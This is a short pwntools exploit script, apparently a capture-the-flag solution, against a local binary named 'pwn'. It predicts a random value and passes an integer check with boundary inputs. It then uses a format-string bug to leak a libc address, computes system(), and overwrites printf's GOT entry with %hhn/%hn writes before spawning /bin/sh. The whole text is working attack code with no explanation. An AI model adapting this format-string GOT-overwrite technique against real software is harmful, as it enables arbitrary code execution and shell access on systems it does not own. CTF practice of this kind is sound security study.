from pwn import *
from LibcSearcher import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./pwn')
t = process('./time')
# step 1:
p.recvuntil('Let\'s see how to pass the randomness and the unknown\n')
rand = int(t.recvuntil('aaaa')[:-4])
out = (rand+1919810) ^ 0x1BF52
print('rand = ', rand)
print('out = ', out)
p.sendline(str(out))

# step 2:
p.recvuntil('Input v1:\n')
p.sendline(str(4294967295))
p.recvuntil('Input v2:\n')
p.sendline(str(4294967195))

# step 3:
p.recvuntil('If you pass, I will give you shell as a gift\n')
elf = ELF('./pwn')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
printf_got = elf.got['printf']

payload = b'%15$p'
p.send(payload)
write = int(p.recv()[:14], 16) - 16
libc_base = write - libc.symbols['write']
system = libc_base + libc.symbols['system']
print('system = ' + hex(system))
# str %6$p
system_l = system & 0xff           # system第一个字节的值
system_h = (system>>8) & 0xffff    # system第二三个字节的值

payload = p64(printf_got) + p64(printf_got + 1)
payload += b'%' + bytes(str(system_l - 16).encode()) + b'c%6$hhn'
payload += b'%' + bytes(str(system_h - system_l).encode()) + b'c%7$hn' + b'\0'
p.sendline(payload)
p.recv()
p.send('/bin/sh\x00')
p.interactive()

